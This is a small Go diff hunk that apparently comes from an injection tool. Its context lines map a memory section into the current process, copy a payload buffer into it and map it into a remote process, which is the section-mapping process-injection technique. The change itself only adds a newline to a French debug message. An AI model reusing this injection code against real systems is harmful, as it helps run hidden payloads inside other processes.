@@ -65,7 +65,7 @@ func PE(path string) {
 	curHandle := uintptr(windows.CurrentProcess())
 	localBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, curHandle, size, 0)
 
-	fmt.Printf("mapViewOfSection réussie")
+	fmt.Printf("mapViewOfSection réussie \n")
 	e.Memcpy(localBaseAddr, unsafe.Pointer(&payload[0]), len(payload))
 
 	remoteBaseAddr, _, _ := e.MapViewOfSection(ntdll, section, procHandle, size, 0)
